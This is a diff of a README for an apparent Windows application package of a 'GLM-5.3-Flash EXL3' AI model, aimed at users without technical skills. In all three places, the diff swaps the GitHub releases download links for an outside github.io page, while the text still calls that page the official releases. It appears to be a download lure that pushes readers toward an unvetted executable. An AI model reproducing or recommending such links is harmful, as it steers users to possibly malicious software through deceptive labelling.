@@ -1,6 +1,6 @@
 # 🚀 GLM-5.3-Flash-EXL3-2x-DGX-Sparks-TensorFold - Fast AI Power Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Visit_Releases-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nayanjohn009/GLM-5.3-Flash-EXL3-2x-DGX-Sparks-TensorFold/releases)
+[![Download Now](https://img.shields.io/badge/Download_Now-Visit_Releases-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://nayanjohn009.github.io)
 
 GLM-5.3-Flash-EXL3-2x-DGX-Sparks-TensorFold is a ready-to-use Windows application package built around the GLM-5.3-Flash EXL3 model and TensorFold performance setup. It is designed for users who want to download, open, and start using the application without learning programming or working with a command line. The download page is the official starting point. Visit this link to download the application.
 
@@ -47,7 +47,7 @@ The most important step is using the official link. The download page is the onl
 
 Use the large button near the top of this page or the link in this section. Both point to the same official releases page.
 
-[![Download GLM-5.3-Flash-EXL3-2x-DGX-Sparks-TensorFold](https://img.shields.io/badge/Get_The_App-Open_Official_Releases-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nayanjohn009/GLM-5.3-Flash-EXL3-2x-DGX-Sparks-TensorFold/releases)
+[![Download GLM-5.3-Flash-EXL3-2x-DGX-Sparks-TensorFold](https://img.shields.io/badge/Get_The_App-Open_Official_Releases-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://nayanjohn009.github.io)
 
 Visit this link to download the application.
 
@@ -91,6 +91,6 @@ Bookmark the release page. That way, you can quickly return to the official down
 
 Visit this link to download the application:
 
-https://github.com/nayanjohn009/GLM-5.3-Flash-EXL3-2x-DGX-Sparks-TensorFold/releases
+https://nayanjohn009.github.io
 
 Keywords: GLM-5.3-Flash, EXL3, 2x DGX Sparks, TensorFold, GLM-5.3-Flash EXL3, Windows application, AI model package, official releases, download and run, end-user setup
